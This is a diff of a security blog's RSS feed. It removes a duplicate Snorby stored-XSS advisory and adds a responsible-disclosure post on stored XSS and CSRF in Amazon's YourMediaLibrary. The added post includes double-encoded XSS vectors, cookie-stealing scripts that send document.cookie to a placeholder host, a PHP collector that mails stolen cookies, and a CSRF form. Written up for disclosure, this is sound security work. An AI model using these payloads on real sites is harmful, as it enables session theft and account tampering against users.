@@ -5,76 +5,9 @@
 		<description>security.. coding / beer / coffee</description>
 		<link>http://deftcode.ninja/</link>
 		<atom:link href="http://deftcode.ninja/feed.xml" rel="self" type="application/rss+xml" />
-		<pubDate>Sun, 13 Sep 2015 05:19:43 +0200</pubDate>
-		<lastBuildDate>Sun, 13 Sep 2015 05:19:43 +0200</lastBuildDate>
+		<pubDate>Sun, 13 Sep 2015 05:23:11 +0200</pubDate>
+		<lastBuildDate>Sun, 13 Sep 2015 05:23:11 +0200</lastBuildDate>
 		<generator>Jekyll v2.4.0</generator>
-		
-			<item>
-				<title>CVE-2015-xxxx – Snorby – 2.6.2 - Stored Cross-site Scripting</title>
-				<description>&lt;h3 id=&quot;vendor&quot;&gt;Vendor&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.snorby.org/&quot; title=&quot;Snorby&quot;&gt;https://www.snorby.org/&lt;/a&gt; – &lt;strong&gt;2.6.2&lt;/strong&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Snorby is a new and modern Snort IDS front-end. The basic fundamental concepts behind snorby are simplicity and power. The project goal is to create a free, open source and highly competitive application for network monitoring for both private and enterprise use.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
-
-&lt;p&gt;Found another Stored Cross-site Scripting (XSS) vulnerability in Snorby. The vulnerability exists in the module for adding a new search type where the user input is not correctly sanitized before being saved it on the database or for example the output is not properly filtered, before its rendering in the saved searches code, in this way the vector gets executed.&lt;/p&gt;
-
-&lt;p&gt;This not require Administrative privileges to being executed.&lt;/p&gt;
-
-&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;CVSS Score&lt;/strong&gt;: 3.5 (&lt;a href=&quot;https://nvd.nist.gov/cvss.cfm?calculator&amp;amp;version=2&amp;amp;vector=(AV:N/AC:M/Au:S/C:N/I:P/A:N)&quot; title=&quot;CVSS v2 Vector (AV:N/AC:M/Au:S/C:N/I:P/A:N)&quot; target=&quot;_blank&quot;&gt;AV:N/AC:M/Au:S/C:N/I:P/A:N&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;XSS vector&lt;/code&gt; is triggered in the &lt;strong&gt;snorby/app/views/saved_searches/view.html.erb&lt;/strong&gt; page:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;$(&amp;#39;#title-header&amp;#39;).replaceWith(&amp;#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;edit edit-search-title&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;title-header&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&amp;#39;+data.title+&amp;#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sub-title&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;(click to edit)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;!--r34dm0r3--&gt;
-
-&lt;h3 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h3&gt;
-
-&lt;p&gt;A simple &lt;code&gt;XSS mitigation&lt;/code&gt; on rails could be the usage of the &lt;strong&gt;sanitize&lt;/strong&gt;, for example the code below filters the xss vector by removing the onerror attribute from the image tag:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;$(&amp;#39;#title-header&amp;#39;).replaceWith(&amp;#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;edit edit-search-title&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;title-header&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&amp;#39;+sanitize data.title+&amp;#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sub-title&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;(click to edit)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; to the &lt;strong&gt;latest&lt;/strong&gt; version on &lt;a href=&quot;https://github.com/Snorby/snorby&quot; title=&quot;GitHub - Snorby&quot; target=&quot;_blank&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;18-07-2015&lt;/strong&gt; – Vendor notification (&lt;a href=&quot;https://github.com/Snorby/snorby/issues/381&quot; title=&quot;GitHub Issue-381&quot; target=&quot;_blank&quot;&gt;GitHub Issue-381&lt;/a&gt;)&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;18-07-2015&lt;/strong&gt; – CVE id requested&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;01-07-2015&lt;/strong&gt; – Vendor acknowledge&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;01-07-2015&lt;/strong&gt; – Vendor pushed a fix (commit-id: &lt;a href=&quot;https://github.com/Snorby/snorby/commit/89d7cbcd3697c8a842f1a61b99e9a78f295798fb&quot; title=&quot;GitHub commit-id: 89d7cbcd3697c8a842f1a61b99e9a78f295798fb&quot; target=&quot;_blank&quot;&gt;89d7cbcd3697c8a842f1a61b99e9a78f295798fb&lt;/a&gt;)&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;22-07-2015&lt;/strong&gt; – CVE id assigned (&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&quot; title=&quot;CVE-2015-5460&quot; target=&quot;_blank&quot;&gt;CVE-2015-5460&lt;/a&gt;)&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;19-07-2015&lt;/strong&gt; – Public disclosure&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&quot; title=&quot;CVE-2015-5460&quot;&gt;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/2015/Jul/15&quot; title=&quot;FullDisclosure&quot;&gt;http://seclists.org/fulldisclosure/2015/Jul/15&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/Snorby/snorby/issues/381&quot; title=&quot;GitHub Issue-381&quot;&gt;https://github.com/Snorby/snorby/issues/381&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-				<pubDate>Sat, 18 Jul 2015 02:00:00 +0200</pubDate>
-				<link>http://deftcode.ninja/post/CVE-2015-xxxx-snorby-ids-ui-stored-cross-site-scripting/</link>
-				<guid isPermaLink="true">http://deftcode.ninja/post/CVE-2015-xxxx-snorby-ids-ui-stored-cross-site-scripting/</guid>
-				
-				
-				<category>security</category>
-				
-				<category>cve</category>
-				
-			</item>
 		
 			<item>
 				<title>CVE-2015-5460 – Snorby – 2.6.2 - Stored Cross-site Scripting</title>
@@ -1769,6 +1702,115 @@ where &lt;strong&gt;XX&lt;/strong&gt; = &lt;code&gt;id of created portfolio&lt;/
 				
 				
 				<category>security</category>
+				
+			</item>
+		
+			<item>
+				<title>Disclosure: Stored XSS in Amazon.com with CSRF Bypass</title>
+				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+
+&lt;p&gt;The &lt;strong&gt;Amazon YourMediaLibrary&lt;/strong&gt; is vulnerable to stored &lt;code&gt;XSS Vulnerability&lt;/code&gt;, the attacker can redirect an user to his profile page and steal user-cookie to perform an &lt;code&gt;CSRF Attack&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Your Media Library is a secure location from which you retrieve all digital products, including eDocs, Amazon Upgrades, the free electronic user manuals that come with some products, and free music files that are available with select CDs.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;proof-of-concept-of-stored-xss---double-encoding-techniqueencoding&quot;&gt;Proof of Concept of Stored XSS - &lt;a href=&quot;https://www.owasp.org/index.php/Double_Encoding&quot; title=&quot;OSWAP - Double Encoding Technique&quot;&gt;Double Encoding Technique&lt;/a&gt;:&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Let’s go:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;First go to yourmedialibrary page &lt;a href=&quot;https://www.amazon.com/gp/ays/index.html&quot; title=&quot;Amazon YourMediaLibrary&quot;&gt;Amazon YourMediaLibrary&lt;/a&gt; and click to Profile&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Insert this vector into &lt;code&gt;Interests&lt;/code&gt; or &lt;code&gt;In my own words&lt;/code&gt; inputs:&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  %253Cscript%253Ealert(document.cookie)%253C%252Fscript%253E
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Wait for auto-saving or click “Save”&lt;/li&gt;
+  &lt;li&gt;Back to profile page to see the injected code&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;possible-attack-scenario-with-csrf-sessionid-bypass&quot;&gt;Possible Attack Scenario with CSRF SessionID Bypass:&lt;/h3&gt;
+
+&lt;p&gt;Since many values of cookie were setted like &lt;strong&gt;HttpOnly&lt;/strong&gt;, the malicious user can’t hijack the session but anyway It can execute an arbiratry operations through an &lt;code&gt;CSRF Attack&lt;/code&gt; knowning the &lt;code&gt;session-id&lt;/code&gt; saved in the &lt;code&gt;user-cookie&lt;/code&gt; (however the session-id does the function of security-token):&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Generate a base html payload to steal user cookie:&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; &amp;lt;script&amp;gt;
+     location.href='//land-domain.com/steal.php?cookie='+document.cookie;
+ &amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Or if you want a payload without redirect:&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; &amp;lt;img style='display:none' src=x onerror=this.src='//land-domain.com/?cookie='+document.cookie&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Attacker adds this double encoded vector into his interests in settings profile page:&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; %253Cscript%253Elocation.href%253D%2527//land-domain.com/steal.php
+ %252Fcookie=%2527%252Bdocument.cookie%253C%252Fscript%253E
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Then It redirects the user to his medialibrary profile page to steal and store cookie by remote malicious file (basic steal.php)&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; $ echo &quot;
+ &amp;lt;?php
+   mail('attacker@mailz.org', 'Cookie', $_GET['cookie']);
+   header('Location: '.$_SERVER['HTTP_REFERER']);
+ ?&amp;gt;&quot; &amp;gt; /var/www/land-domain.com/steal.php
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now he’s got a ‘session-id=180-0536506-4528302′ of user (that is not secured).&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;With this simple CSRF page:&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; &amp;lt;html&amp;gt;
+ &amp;lt;head&amp;gt;
+     &amp;lt;title&amp;gt;Amazon CSRF&amp;lt;/title&amp;gt;
+ &amp;lt;/haed&amp;gt;
+ &amp;lt;body&amp;gt;
+     &amp;lt;form method=&quot;POST&quot; action=&quot;https://www.amazon.com/gp/ays/ajax/setProfile.html&quot;&amp;gt;
+         &amp;lt;input type=&quot;hidden&quot; name=&quot;key&quot; value=&quot;inMyOwnWords&quot;&amp;gt;
+         &amp;lt;input type=&quot;hidden&quot; name=&quot;value&quot; value=&quot;injected&quot;&amp;gt;
+         &amp;lt;input type=&quot;hidden&quot; name=&quot;sessionId&quot; value=&quot;180-0536506-4528302&quot;&amp;gt;
+     &amp;lt;/form&amp;gt;
+ &amp;lt;/body&amp;gt;
+ &amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The malicious user can change all profile settings of user.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;example-demostration-screen&quot;&gt;Example demostration screen&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/amazon-xss.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/amazon-xss.png&quot; alt=&quot;Prestashop Demo XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;28/05/2014&lt;/strong&gt; – Report to Amazon Security Team&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;29/05/2014&lt;/strong&gt; – Received a response from amazon that assign a ticket&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;01/06/2014&lt;/strong&gt; – Amazon fix the bug&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;02/06/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+				<pubDate>Mon, 02 Jun 2014 11:20:01 +0200</pubDate>
+				<link>http://deftcode.ninja/post/stored-xss-in-amazon-com-with-csrf-bypass/</link>
+				<guid isPermaLink="true">http://deftcode.ninja/post/stored-xss-in-amazon-com-with-csrf-bypass/</guid>
+				
+				
+				<category>responsible-disclosure</category>
 				
 			</item>
 		
